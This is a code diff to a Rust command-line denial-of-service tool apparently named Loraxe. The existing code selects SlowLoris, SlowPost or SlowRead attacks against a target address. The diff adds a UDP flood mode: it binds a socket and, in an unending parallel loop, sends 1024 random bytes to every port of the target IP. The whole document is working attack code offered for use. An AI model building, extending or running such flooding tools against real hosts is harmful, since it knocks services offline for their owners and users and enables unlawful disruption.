@@ -1,9 +1,13 @@
 extern crate pretty_env_logger;
+#[macro_use] extern crate log;
 // #[macro_use] extern crate log;
 // #[macro_use] extern crate structopt;
 
+use rayon::prelude::*;
+use std::net::{UdpSocket, SocketAddr, ToSocketAddrs};
 use structopt::StructOpt;
 use std::time::Duration;
+use rand::Rng;
 use std::env;
 use std::error::Error;
 
@@ -33,6 +37,10 @@ struct Opt {
     /// Use a random user-agent 
     #[structopt(short = "r", long = "rand-user-agent")]
     rand_ua: bool,
+
+    /// Enable udp flood mode
+    #[structopt(long = "flood", short = "f")]
+    flood: bool,
 
     /// Set number of sockets
     #[structopt(short = "s", long = "sockets", default_value = "150")]
@@ -89,26 +97,60 @@ fn main() -> Result<(), Box<dyn Error>> {
     let dos_type = if opt.post { DOSType::SlowPost } else if opt.read { DOSType::SlowRead } else { DOSType::SlowLoris};
 
 
-    // TODO Create config from CLI arguments using Clap
-    let config = Config {
-        sock_timeout: Duration::from_secs(opt.sockets_delay),
-        https: opt.ssl,
-        addr: opt.ip,
-        port: opt.port,
-        rand_ua: opt.rand_ua,
-        socket_count: opt.sockets,
-        dos_type,
-        delay: opt.delay,
-        read_size: opt.read_size
-    };
+    let ip: &str = &opt.ip.clone();
 
-    let mut loraxe = Loraxe::new(config);
+    if !opt.flood {
 
-    // Create initial sockets
-    loraxe.create_sockets()?;
+        // TODO Create config from CLI arguments using Clap
+        let config = Config {
+            sock_timeout: Duration::from_secs(opt.sockets_delay),
+            https: opt.ssl,
+            addr: opt.ip,
+            port: opt.port,
+            rand_ua: opt.rand_ua,
+            socket_count: opt.sockets,
+            dos_type,
+            delay: opt.delay,
+            read_size: opt.read_size
+        };
 
-    // Start dos
-    loraxe.attack()?;
+
+        let mut loraxe = Loraxe::new(config);
+
+        // Create initial sockets
+        loraxe.create_sockets()?;
+
+        // Start dos
+        loraxe.attack()?;
+
+    } else {
+
+        let mut rng = rand::thread_rng();
+
+        let bytes = (0..1024).into_iter().map(|i| {
+            rng.gen::<u8>()
+        }).collect::<Vec<u8>>();
+
+
+        let sock = UdpSocket::bind("0.0.0.0:1337").expect("Couldn't bind to address");
+
+        loop {
+            println!("Sending packet");
+
+            (0..65535).into_par_iter().for_each(|i: i32|{
+                let mut url = String::with_capacity(ip.len() + i.to_string().len());
+                url.push_str(&ip);
+                url.push_str(":");
+                url.push_str(&i.to_string());
+
+                let sock_addr: SocketAddr = url.to_socket_addrs().unwrap().collect::<Vec<SocketAddr>>()[0];
+
+                // println!("Sending Packet to port {}", i);
+                sock.send_to(&bytes, sock_addr);
+            })
+        }
+    }
+
 
     Ok(())
 }
